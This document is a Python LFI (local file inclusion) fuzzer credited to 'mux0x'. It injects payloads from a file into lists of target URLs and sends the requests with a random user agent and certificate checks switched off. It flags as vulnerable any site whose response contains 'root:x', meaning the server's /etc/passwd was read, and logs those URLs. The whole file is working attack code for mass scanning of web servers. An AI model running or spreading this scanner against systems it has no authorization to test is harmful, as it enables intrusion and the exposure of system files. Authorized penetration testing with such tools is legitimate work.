#!/usr/bin/python3
#script by mux0x
import exurl
import requests
from termcolor import colored
from tqdm import tqdm
import random
import urllib3
import argparse


def logo():
    print(colored('''\n\n 

                                        /$$$$$$           
                                       /$$$_  $$          
     /$$$$$$/$$$$  /$$   /$$ /$$   /$$| $$$$\ $$ /$$   /$$
    | $$_  $$_  $$| $$  | $$|  $$ /$$/| $$ $$ $$|  $$ /$$/
    | $$ \ $$ \ $$| $$  | $$ \  $$$$/ | $$\ $$$$ \  $$$$/ 
    | $$ | $$ | $$| $$  | $$  >$$  $$ | $$ \ $$$  >$$  $$ 
    | $$ | $$ | $$|  $$$$$$/ /$$/\  $$|  $$$$$$/ /$$/\  $$
    |__/ |__/ |__/ \______/ |__/  \__/ \______/ |__/  \__/

''', 'red', attrs=[]))
    print(colored('                      [+] LFI FUZZER', 'cyan', attrs=['bold']))
    print(colored('                      [+] github @mux0x', 'cyan', attrs=['bold']))
    print("")
    print(colored('########################################################################', 'green', attrs=[]))
    print("")

logo()

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--list", help="list of links --list urls.txt")
parser.add_argument("-u", "--user_agents", help="file containing list of user agents -u useragents.txt")
parser.add_argument("-o", "--output", help="output file containing the vulnerable links")
parser.add_argument("-p", "--payloads", help="file containing list of payloads")
args = parser.parse_args()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
user_agenta = tuple(open(args.user_agents, 'r'))
user_agents = [w.replace('\n', '') for w in user_agenta]
user_agent_random =random.choice(user_agents)


def injecting():
    urls_list = tuple(open(args.list, 'r'))
    payloads_list = tuple(open(args.payloads, 'r'))
    splilitted_urls = []
    for ind,payload in enumerate(payloads_list):
        locals()["listurls" + str(ind)] = exurl.split_urls(urls_list, payload)
        splilitted_urls.extend(locals()["listurls" + str(ind)])
    return splilitted_urls

def send_request(line):
    line = line.rstrip()
    headers = {"User-Agent": str(user_agent_random)}
    try:
        r = requests.get(line, headers=headers, verify=False, timeout=15)
        content = r.content
        if b"root:x" in content:
            print(colored("\n\n[+] Vulnerable :> ", 'red') + line + "\n")
            f = open(args.output, "a")
            f.write(line + "\n")
            f.close()
    except KeyboardInterrupt:
        exit()
    except Exception as error:
        print(line, error)

urls = injecting()
array_length = len(urls)

#start progress bar with calling execution functinon
for i in tqdm(range(array_length), desc="Loading...", ascii=False, ncols=75):
    line = urls[i]
    send_request(line)